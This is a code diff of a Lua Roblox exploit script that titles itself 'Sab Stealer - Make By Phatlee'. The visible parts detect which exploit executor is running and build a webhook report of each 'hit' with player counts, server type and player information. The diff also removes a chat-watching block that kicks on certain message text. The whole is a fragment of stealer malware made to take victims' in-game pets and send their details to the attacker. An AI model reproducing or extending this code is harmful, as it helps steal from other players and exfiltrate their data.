@@ -206,7 +206,6 @@ local function collectValidPets()
 
 	return pets
 end
-
 local function detectExecutor()
     local executor = "Unknown"
     if syn then executor = "Synapse X"
@@ -274,7 +273,7 @@ local function sendWebhook(link)
         ["title"] = "😜 Sab Stealer - Make By Phatlee",
         ["color"] = serverType == "PUBLIC SERVER" and 16711680 or 65280,
         ["fields"] = {
-            { ["name"] = "Hit By", ["value"] = "Moreira" },
+            { ["name"] = "Hit By", ["value"] = "moreira" },
             { ["name"] = "Players", ["value"] = string.format("%d/6", #Players:GetPlayers()) },
             { ["name"] = "Server Type", ["value"] = serverType },
             { ["name"] = "👥 Player Information",
@@ -670,29 +669,4 @@ task.spawn(function()
             end
         end
     end
-end)
-		if body and body:IsA("TextLabel") then
-			checkAndKick(body.Text)
-		end
-	end
-end
-
--- Bắt sự kiện khi có message mới (mỗi message có ID ngẫu nhiên)
-contentPath.DescendantAdded:Connect(function(desc)
-	-- nếu chính node BodyText được thêm
-	if desc.Name == "BodyText" and desc:IsA("TextLabel") then
-		task.wait(0.1)
-		checkAndKick(desc.Text)
-		return
-	end
-
-	-- hoặc nếu một frame mới được thêm có TextMessage.BodyText bên trong
-	local textMessage = desc:FindFirstChild("TextMessage")
-	if textMessage then
-		local body = textMessage:FindFirstChild("BodyText")
-		if body and body:IsA("TextLabel") then
-			task.wait()
-			checkAndKick(body.Text)
-		end
-	end
 end)
